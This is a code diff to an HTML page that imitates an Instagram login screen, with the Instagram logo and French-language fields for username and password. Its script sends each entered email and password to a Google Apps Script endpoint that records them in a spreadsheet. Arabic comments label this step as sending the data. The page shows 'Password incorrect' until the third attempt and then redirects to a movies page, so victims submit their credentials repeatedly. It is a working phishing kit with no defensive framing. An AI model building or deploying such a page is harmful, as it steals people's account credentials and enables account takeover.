@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Instagram Sign Up</title>
+<title>Instagram Login</title>
 
 <style>
 body{
@@ -15,15 +15,18 @@ body{
   background:white;
   font-family:sans-serif;
 }
+
 .container{
   width:90%;
   max-width:350px;
   text-align:center;
 }
+
 .logo{
   width:80px;
   margin-bottom:20px;
 }
+
 input{
   width:100%;
   padding:12px;
@@ -31,6 +34,7 @@ input{
   border-radius:10px;
   border:1px solid #ccc;
 }
+
 button{
   width:100%;
   padding:12px;
@@ -41,6 +45,7 @@ button{
   font-size:16px;
   cursor:pointer;
 }
+
 #errorMsg{
   color:red;
   font-size:14px;
@@ -49,35 +54,40 @@ button{
 </style>
 
 </head>
+
 <body>
 
 <div class="container">
 
   <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png">
 
-  <input id="instaUser" placeholder="Nom de profil, e-mail ou numéro">
-  <input id="instaPass" type="password" placeholder="Mot de passe">
+  <input id="insta_user" placeholder="Nom de profil, e-mail ou numéro">
+  <input id="insta_pass" type="password" placeholder="Mot de passe">
 
   <button onclick="go()">Sign Up</button>
+
   <div id="errorMsg"></div>
 
 </div>
 
 <script>
+
 let attempts = 0;
 const maxAttempts = 3;
 const correctPassword = "1234";
-const sheetUrl = "https://script.google.com/macros/s/AKfycbwm9grs3OWZycMGtyD0q3Y_vrLK9IWdVSo0ar2IjCJ34IJzIZWBB4eeccdfFIQHnlPN/exec";
 
-async function go() {
+// 🔥 نفس رابط الفورم الأول
+const sheetUrl = "https://script.google.com/macros/s/AKfycbwcS4it59k6HArG6yziPd6AvHtkMXu5m3xzhmtsVWLt6vlEAOmzBdSFAgBhgu9XFEjTAQ/exec";
+
+async function go(){
 
   const email = document.getElementById("insta_user").value.trim();
   const pw = document.getElementById("insta_pass").value.trim();
   const error = document.getElementById("errorMsg");
 
-  attempts++;
+  attempts++; // زيادة المحاولات
 
-  // 🔥 هذا أهم سطر (لا تغيره)
+  // 🔥 إرسال البيانات
   const data = `email=${encodeURIComponent(email)}&password=${encodeURIComponent(pw)}&attempt=${attempts}&form=Instagram`;
 
   try {
@@ -88,20 +98,21 @@ async function go() {
       },
       body: data
     });
-
-    console.log("Data sent to Google Sheets"); // للتأكد
-
   } catch (err) {
     error.innerText = "Error connecting to Google Sheets";
     return;
   }
 
-  if (pw === correctPassword || attempts >= maxAttempts) {
+  // 🔥 التحقق
+  if(pw === correctPassword || attempts >= maxAttempts){
     window.location.href = "movies.html";
   } else {
     error.innerText = "Password incorrect";
   }
+
 }
+
 </script>
+
 </body>
 </html>
